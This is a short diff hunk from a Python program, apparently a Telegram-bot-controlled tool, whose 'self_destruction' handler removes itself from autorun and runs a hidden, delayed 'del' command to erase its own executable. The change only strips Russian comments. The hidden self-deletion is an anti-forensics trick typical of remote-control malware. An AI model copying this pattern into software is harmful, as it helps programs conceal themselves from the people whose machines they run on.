@@ -79,13 +79,10 @@ def register_self_destruction(dp):
                 remove_from_autorun(program_name)
 
                 def self_destruct():
-                    # Получаем путь к исполняемому файлу
                     exe_path = sys.executable
 
-                    # Команда для удаления файла через командную строку
                     delete_command = f'del "{exe_path}"'
 
-                    # Запускаем команду в скрытом режиме, без открытия консоли
                     subprocess.Popen(f'ping localhost -n 6 > nul && {delete_command}',
                                     shell=True,
                                     creationflags=subprocess.CREATE_NO_WINDOW)
